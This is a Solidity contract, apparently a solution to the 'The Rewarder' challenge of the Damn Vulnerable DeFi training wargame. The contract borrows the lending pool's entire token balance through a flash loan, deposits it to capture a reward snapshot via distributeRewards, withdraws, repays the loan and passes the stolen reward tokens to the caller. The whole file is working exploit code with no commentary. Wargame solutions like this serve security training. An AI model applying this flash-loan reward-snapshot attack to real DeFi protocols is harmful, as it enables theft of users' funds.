// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract TheRewarderExploiter {
    TheRewarderPool public rewarder;
    FlashLoanerPool public pool;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;

    constructor(address rewarderAddress, address poolAddress, address liquidityTokenAddress, address rewardTokenAddress) public {
        rewarder = TheRewarderPool(rewarderAddress);
        pool = FlashLoanerPool(poolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function attack() public {
        uint256 balance = liquidityToken.balanceOf(address(pool));
        pool.flashLoan(balance);

        uint256 amount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, amount);
    }

    function receiveFlashLoan(uint256) external {
        uint256 balance = liquidityToken.balanceOf(address(this));
        
        liquidityToken.approve(address(rewarder), balance);
        rewarder.deposit(balance);

        rewarder.distributeRewards();

        rewarder.withdraw(balance);
        liquidityToken.transfer(address(pool), balance);
    }
}